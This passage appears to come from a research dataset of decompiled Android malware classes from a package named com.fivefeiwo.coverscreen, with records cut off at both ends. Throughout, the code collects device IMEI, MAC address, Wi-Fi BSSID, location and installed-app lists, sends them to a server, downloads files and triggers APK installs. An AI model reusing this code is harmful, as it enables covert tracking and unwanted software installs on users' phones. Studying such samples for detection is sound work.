Throwable th) {       if (0 != 0) {         httpURLConnection.disconnect();       }       throw th;     }   } } "
"msc_data/decompiled_malware_class/001EF856699CBB1791EF2DEB00F66DD259491C332E0A8A4DC3ADF80531EBFF8B\com.fivefeiwo.coverscreen\AbstractC0002a.code","public abstract class AbstractC0002a {   static boolean a=false;   private String c;   private Context d;   private TimerTask g;   private Handler i;   boolean b=false;   private boolean e=false;   private int f=10;   private Timer h=new Timer();   public AbstractC0002a(  Context context,  String str){     this.i=null;     this.d=context;     this.c=str;     a=false;     ap.b(context,S.j,S.k,str);     ap.a(context,S.j,S.m,true);     try {       this.i=new Handler();     }  catch (    Exception e) {     }     try {       aj.a();     }  catch (    Exception e2) {     }     try {       P.c(context);     }  catch (    Exception e3) {     }     if (P.a(context) && P.a(this.d)) {       if (!this.e) {         Context context2=this.d;         a(true);       }       new C0003b(this).start();     }   }   public static void a(  AbstractC0002a abstractC0002a){     JSONObject a2=H.a(abstractC0002a.d,abstractC0002a.c,S.a);     ab abVar=new ab();     abVar.a(abstractC0002a.d,I.c(),abstractC0002a.c,a2.toString());     abVar.a(new C0005d(abstractC0002a));     Z.a().a(abVar);   }   public static void b(  AbstractC0002a abstractC0002a){     String a2=ap.a(abstractC0002a.d,S.j,""packnames_feiwocp"".replace(""_feiwocp"",""""),(String)null);     if (a2 != null) {       String[] split=a2.split("","");       JSONArray jSONArray=new JSONArray();       for (      String str : split) {         if (!aq.a(str)) {           JSONObject jSONObject=new JSONObject();           try {             jSONObject.put(""packageName_feiwocp"".replace(""_feiwocp"",""""),str);           }  catch (          JSONException e) {           }           jSONArray.put(jSONObject);         }       }       if (jSONArray.length() != 0) {         JSONObject a3=H.a(abstractC0002a.d,S.a,jSONArray);         ab abVar=new ab();         abVar.a(abstractC0002a.d,I.d(),abstractC0002a.c,a3.toString());         abVar.a(new C0006e(abstractC0002a));         Z.a().a(abVar);       }     }   }   public static boolean isShowAtScreenOn(){     return a;   }   public void a(){     this.e=true;     if (this.g != null) {       this.g.cancel();       this.g=null;       this.h.cancel();     }   }   public final void a(  JSONArray jSONArray){     for (int i=0; i < jSONArray.length(); i++) {       String optString=jSONArray.optJSONObject(i).optString(""image_feiwocp"".replace(""_feiwocp"",""""));       if (!aq.a(optString)) {         this.i.postDelayed(new RunnableC0007f(this,optString),10L);       }       String optString2=jSONArray.optJSONObject(i).optString(""icon_feiwocp"".replace(""_feiwocp"",""""));       if (!aq.a(optString2)) {         this.i.postDelayed(new RunnableC0008g(this,optString2),10L);       }     }   }   public final void a(  boolean z){     if (z) {       this.f=10;     }  else {       this.f--;     }     if (this.f >= 0 && !this.e) {       if (z) {         if (this.g != null) {           this.g.cancel();           Context context=this.d;         }         b();         return;       }       if (this.g != null) {         Context context2=this.d;         return;       }       this.g=new C0004c(this);       this.h.schedule(this.g,360000L);       Context context3=this.d;     }   }   public final boolean a(  List list,  int i){     try {       Intent intent=new Intent(this.d,(Class<?>)SA.class);       intent.addFlags(335544320);       intent.putExtra(""itemList_feiwocp"".replace(""_feiwocp"",""""),(ArrayList)list);       intent.putExtra(""index_feiwocp"".replace(""_feiwocp"",""""),i);       if (this.i != null) {         this.i.post(new RunnableC0009h(this,intent));       }  else {         this.d.startActivity(intent);       }       return true;     }  catch (    Exception e) {       return false;     }   }   public abstract void b();   public void c(){     this.b=false;     this.g=null;   }   public final String d(){     return this.c;   }   public final Context e(){     return this.d;   } } "
"msc_data/decompiled_malware_class/001EF856699CBB1791EF2DEB00F66DD259491C332E0A8A4DC3ADF80531EBFF8B\com.fivefeiwo.coverscreen\ac.code","public final class ac {   private static ac c;   private double a=0.0d;   private double b=0.0d;   public ac(){     new ad(this);   }   public static ac c(){     if (c == null) {       c=new ac();     }     return c;   }   public final double a(){     return this.a;   }   public final double b(){     return this.b;   } } "
"msc_data/decompiled_malware_class/001EF856699CBB1791EF2DEB00F66DD259491C332E0A8A4DC3ADF80531EBFF8B\com.fivefeiwo.coverscreen\ad.code","public final class ad implements LocationListener {   private ac a;   public ad(  ac acVar){     this.a=acVar;   }   @Override public final void onLocationChanged(  Location location){     this.a.a=location.getLatitude();     this.a.b=location.getLongitude();   }   @Override public final void onProviderDisabled(  String str){   }   @Override public final void onProviderEnabled(  String str){   }   @Override public final void onStatusChanged(  String str,  int i,  Bundle bundle){   } } "
"msc_data/decompiled_malware_class/001EF856699CBB1791EF2DEB00F66DD259491C332E0A8A4DC3ADF80531EBFF8B\com.fivefeiwo.coverscreen\ae.code","public final class ae {   private static ae b=null;   private static Context c;   private NotificationManager a;   private ae(  Context context){     this.a=null;     if (this.a == null) {       this.a=(NotificationManager)context.getSystemService(""notification"");     }   }   private ImageView a(  View view){     if (!(view instanceof ViewGroup)) {       if (view instanceof ImageView) {         return (ImageView)view;       }       return null;     }     ViewGroup viewGroup=(ViewGroup)view;     for (int childCount=viewGroup.getChildCount(); childCount > 0; childCount--) {       ImageView a=a(viewGroup.getChildAt(childCount - 1));       if (a != null && a.getId() == 16908294) {         return a;       }     }     return null;   }   public static ae a(  Context context){     c=context;     if (b == null) {       b=new ae(c);     }     return b;   }   public final void a(  int i){     this.a.cancel(i);   }   public final void a(  int i,  int i2,  String str,  String str2,  String str3,  Intent intent,  int i3,  String str4,  long j){     Notification notification=new Notification();     notification.icon=android.R.drawable.ic_menu_share;     notification.tickerText=str;     notification.flags=i3;     notification.when=j;     notification.setLatestEventInfo(c,str2,str3,PendingIntent.getActivity(c,0,intent,134217728));     if (str4 == null || str4.length() == 0 || notification == null) {       return;     }     try {       ImageView a=a(View.inflate(c,notification.contentView.getLayoutId(),null));       Y.a();       Bitmap a2=K.a().a(c,Y.a(c,S.d,str4));       if (a2 != null) {         notification.contentView.setImageViewBitmap(a.getId(),a2);       }       this.a.notify(i,notification);     }  catch (    Exception e) {       new StringBuilder().append(""NotificationManagerTool >> "").append(e.getMessage());     }   } } "
"msc_data/decompiled_malware_class/001EF856699CBB1791EF2DEB00F66DD259491C332E0A8A4DC3ADF80531EBFF8B\com.fivefeiwo.coverscreen\af.code","public final class af {   private static final String a=""NumberUtil.java_feiwocp"".replace(""_feiwocp"","""");   public static int a(  String str,  int i){     if (str == null || str.equals("""")) {       return 0;     }     try {       return Integer.parseInt(str.trim());     }  catch (    NumberFormatException e) {       Log.w(a,""errorMessage > "" + e);       return 0;     }   } } "
"msc_data/decompiled_malware_class/001EF856699CBB1791EF2DEB00F66DD259491C332E0A8A4DC3ADF80531EBFF8B\com.fivefeiwo.coverscreen\ag.code","public final class ag {   private static ag a=null;   private ag(){   }   public static ag a(){     if (a == null) {       a=new ag();     }     return a;   }   public static void a(  Context context,  String str){     if (aq.a(str)) {       return;     }     File file=new File(str);     Intent intent=new Intent();     intent.addFlags(272629760);     intent.setAction(""android.intent.action.VIEW"");     intent.setDataAndType(Uri.fromFile(file),""application/vnd.android.package-archive_feiwocp"".replace(""_feiwocp"",""""));     context.startActivity(intent);   }   public static void b(  Context context,  String str){     if (aq.a(str)) {       return;     }     PackageManager packageManager=context.getPackageManager();     Intent intent=new Intent();     try {       intent=packageManager.getLaunchIntentForPackage(str);     }  catch (    ActivityNotFoundException e) {     }     context.startActivity(intent);   }   public static boolean c(  Context context,  String str){     if (aq.a(str)) {       return false;     }     try {       context.getPackageManager().getPackageInfo(str,1);       return true;     }  catch (    Exception e) {       return false;     }   } } "
"msc_data/decompiled_malware_class/001EF856699CBB1791EF2DEB00F66DD259491C332E0A8A4DC3ADF80531EBFF8B\com.fivefeiwo.coverscreen\ah.code","public final class ah {   private static ah a;   private ah(){     ""PackageInfoManager_feiwocp"".replace(""_feiwocp"","""");   }   public static ah a(){     if (a == null) {       a=new ah();     }     return a;   }   public static String a(  Context context,  boolean z){     int i=0;     StringBuffer stringBuffer=new StringBuffer();     List<PackageInfo> installedPackages=context.getPackageManager().getInstalledPackages(0);     while (true) {       int i2=i;       if (i2 >= installedPackages.size()) {         return stringBuffer.toString().substring(1);       }       PackageInfo packageInfo=installedPackages.get(i2);       if ((packageInfo.applicationInfo.flags & 1) == 0) {         stringBuffer.append("","");         stringBuffer.append(packageInfo.packageName);       }       i=i2 + 1;     }   }   public static boolean a(  Context context,  String str){     if (aq.a(str)) {       return false;     }     try {       context.getPackageManager().getPackageInfo(str,1);       return true;     }  catch (    PackageManager.NameNotFoundException e) {       return false;     }   } } "
"msc_data/decompiled_malware_class/001EF856699CBB1791EF2DEB00F66DD259491C332E0A8A4DC3ADF80531EBFF8B\com.fivefeiwo.coverscreen\ai.code","public final class ai { static {     ""SAVE_IMEI_feiwocp"".replace(""_feiwocp"","""");   }   public static String a(){     try {       return Build.MANUFACTURER;     }  catch (    Exception e) {       return """";     }   }   public static String a(  Context context){     String str;     try {       str=((TelephonyManager)context.getSystemService(""phone"")).getDeviceId();     }  catch (    Exception e) {       str=null;     }     return aq.a(str) ? b(context) : str;   }   public static String b(){     try {       return Build.MODEL;     }  catch (    Exception e) {       return """";     }   }   public static String b(  Context context){     try {       return ((WifiManager)context.getSystemService(""wifi_feiwocp"".replace(""_feiwocp"",""""))).getConnectionInfo().getMacAddress();     }  catch (    Exception e) {       return null;     }   }   public static String c(){     try {       return Build.VERSION.SDK;     }  catch (    Exception e) {       return """";     }   }   public static String c(  Context context){     try {       return ((WifiManager)context.getSystemService(""wifi_feiwocp"".replace(""_feiwocp"",""""))).getConnectionInfo().getBSSID();     }  catch (    Exception e) {       return null;     }   }   public static ao d(  Context context){     ao aoVar=new ao();     DisplayMetrics displayMetrics=new DisplayMetrics();     ((WindowManager)context.getSystemService(""window_feiwocp"".replace(""_feiwocp"",""""))).getDefaultDisplay().getMetrics(displayMetrics);     aoVar.a=displayMetrics.widthPixels;     aoVar.b=displayMetrics.heightPixels;     return aoVar;   }   public static String d(){     try {       return Build.VERSION.RELEASE;     }  catch (    Exception e) {       return """";     }   } } "
"msc_data/decompiled_malware_class/001EF856699CBB1791EF2DEB00F66DD259491C332E0A8A4DC3ADF80531EBFF8B\com.fivefeiwo.coverscreen\aj.code","public final class aj {   private static aj a=null;   private Handler b=new al(this);   private ConcurrentHashMap c=new ConcurrentHashMap();   private ExecutorService d=Executors.newSingleThreadExecutor();   private ConcurrentHashMap e=new ConcurrentHashMap();   public static Bitmap a(  Context context,  String str){     Bitmap bitmap;     if (!new File(str).exists()) {       return null;     }     BitmapFactory.Options options=new BitmapFactory.Options();     options.inJustDecodeBounds=true;     BitmapFactory.decodeFile(str,options);     int i=options.outWidth;     int i2=options.outHeight;     ao d=ai.d(context);     int i3=1;     while (i / 2 > d.a && i2 / 2 > d.b) {       i/=2;       i2/=2;       i3<<=1;     }     options.inPurgeable=true;     options.inInputShareable=true;     options.inSampleSize=i3;     options.inJustDecodeBounds=false;     File file=new File(str);     if (file.exists()) {       bitmap=BitmapFactory.decodeFile(str,options);       if (bitmap == null) {         file.delete();       }     }  else {       bitmap=null;     }     return bitmap;   }   public static aj a(){     if (a == null) {       a=new aj();     }     return a;   }   public static void a(  aj ajVar,  Context context,  String str){     HttpURLConnection httpURLConnection;     FileOutputStream fileOutputStream;     HttpURLConnection httpURLConnection2;     InputStream inputStream;     FileOutputStream fileOutputStream2;     FileOutputStream fileOutputStream3=null;     fileOutputStream3=null;     HttpURLConnection httpURLConnection3=null;     Y.a();     String a2=Y.a(context,S.d,str);     File file=new File(a2 + ""."" + System.currentTimeMillis()+ "".temp_feiwocp"".replace(""_feiwocp"",""""));     File file2=new File(a2);     if (file2.exists()) {       return;     }     try {       httpURLConnection2=(HttpURLConnection)new URL(str).openConnection();       try {         httpURLConnection2.setConnectTimeout(5000);         httpURLConnection2.setReadTimeout(5000);         httpURLConnection2.setRequestMethod(""GET_feiwocp"".replace(""_feiwocp"",""""));         httpURLConnection2.connect();         inputStream=httpURLConnection2.getInputStream();         fileOutputStream2=new FileOutputStream(file);       }  catch (      Exception e) {         httpURLConnection3=httpURLConnection2;         fileOutputStream=null;       } catch (      Throwable th) {         httpURLConnection=httpURLConnection2;         th=th;       }     }  catch (    Exception e2) {       fileOutputStream=null;     } catch (    Throwable th2) {       th=th2;       httpURLConnection=null;     }     try {       byte[] bArr=new byte[1024];       while (true) {         int read=inputStream.read(bArr);         if (read == -1) {           break;         }  else {           fileOutputStream2.write(bArr,0,read);         }       }       fileOutputStream2.flush();       fileOutputStream2.close();       file.renameTo(file2);       try {         fileOutputStream2.close();         if (httpURLConnection2 != null) {           httpURLConnection2.disconnect();         }       }  catch (      IOException e3) {       }     }  catch (    Exception e4) {       httpURLConnection3=httpURLConnection2;       fileOutputStream=fileOutputStream2;       if (fileOutputStream != null) {         try {           fileOutputStream.close();         }  catch (        IOException e5) {           return;         }       }       if (httpURLConnection3 != null) {         httpURLConnection3.disconnect();       }     } catch (    Throwable th3) {       fileOutputStream3=fileOutputStream2;       httpURLConnection=httpURLConnection2;       th=th3;       if (fileOutputStream3 != null) {         try {           fileOutputStream3.close();         }  catch (        IOException e6) {           throw th;         }       }       if (httpURLConnection != null) {         httpURLConnection.disconnect();       }       throw th;     }   }   public final Drawable a(  Context context,  String str,  am amVar){     boolean z;     if (this.c.containsKey(str)) {       Queue queue=(Queue)this.c.get(str);       if (amVar != null) {         queue.add(amVar);       }       z=true;     }  else {       ConcurrentLinkedQueue concurrentLinkedQueue=new ConcurrentLinkedQueue();       this.c.put(str,concurrentLinkedQueue);       if (amVar != null) {         concurrentLinkedQueue.add(amVar);       }       z=false;     }     if (!z) {       this.d.submit(new ak(this,context,str));     }     return null;   } } "
"msc_data/decompiled_malware_class/001EF856699CBB1791EF2DEB00F66DD259491C332E0A8A4DC3ADF80531EBFF8B\com.fivefeiwo.coverscreen\ak.code","public final class ak implements Runnable {   private Context a;   private String b;   private aj c;   public ak(  aj ajVar,  Context context,  String str){     this.c=ajVar;     this.a=context;     this.b=str;   }   @Override public final void run(){     ConcurrentHashMap concurrentHashMap;     Handler handler;     Handler handler2;     Y.a();     String a=Y.a(this.a,S.d,this.b);     concurrentHashMap=this.c.e;     WeakReference weakReference=(WeakReference)concurrentHashMap.get(this.b);     Bitmap bitmap=weakReference != null ? (Bitmap)weakReference.get() : null;     if (bitmap == null) {       try {         aj ajVar=this.c;         bitmap=aj.a(this.a,a);       }  catch (      Exception e) {       }     }     if (bitmap == null) {       try {         aj.a(this.c,this.a,this.b);       }  catch (      Exception e2) {       }     }     if (bitmap == null) {       try {         aj ajVar2=this.c;         bitmap=aj.a(this.a,a);       }  catch (      Exception e3) {       }     }     new StringBuilder().append(""loadDrawable complete, bitmap: "").append(bitmap).append("", url: "").append(this.b);     handler=this.c.b;     handler2=this.c.b;     handler.sendMessage(handler2.obtainMessage(0,new Object[]{this.b,bitmap}));   } } "
"msc_data/decompiled_malware_class/001EF856699CBB1791EF2DEB00F66DD259491C332E0A8A4DC3ADF80531EBFF8B\com.fivefeiwo.coverscreen\al.code","public final class al extends Handler {   private aj a;   public al(  aj ajVar){     this.a=ajVar;   }   @Override public final void handleMessage(  Message message){     ConcurrentHashMap concurrentHashMap;     ConcurrentHashMap concurrentHashMap2;     if (message.obj == null) {       return;     }     Object[] objArr=(Object[])message.obj;     String str=(String)objArr[0];     Bitmap bitmap=(Bitmap)objArr[1];     BitmapDrawable bitmapDrawable=null;     if (bitmap != null) {       concurrentHashMap2=this.a.e;       concurrentHashMap2.put(str,new WeakReference(bitmap));       bitmapDrawable=new BitmapDrawable(bitmap);     }     concurrentHashMap=this.a.c;     Queue queue=(Queue)concurrentHashMap.remove(str);     if (queue != null) {       Iterator it=queue.iterator();       while (it.hasNext()) {         ((am)it.next()).a(bitmapDrawable);       }     }   } } "
"msc_data/decompiled_malware_class/001EF856699CBB1791EF2DEB00F66DD259491C332E0A8A4DC3ADF80531EBFF8B\com.fivefeiwo.coverscreen\am.code","public interface am {   void a(  Drawable drawable); } "
"msc_data/decompiled_malware_class/001EF856699CBB1791EF2DEB00F66DD259491C332E0A8A4DC3ADF80531EBFF8B\com.fivefeiwo.coverscreen\an.code","public final class an {   public static int a(  Context context,  float f){     return (int)((context.getResources().getDisplayMetrics().density * f) + 0.5f);   }   public static Drawable a(  String str){     Drawable drawable=null;     try {       if (S.f.equals(str)) {         drawable=Drawable.createFromStream(new Base64InputStream(new ByteArrayInputStream(""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"".getBytes(""UTF-8"")),0),null);       }  else       if (S.g.equals(str)) {         drawable=Drawable.createFromStream(new Base64InputStream(new ByteArrayInputStream(""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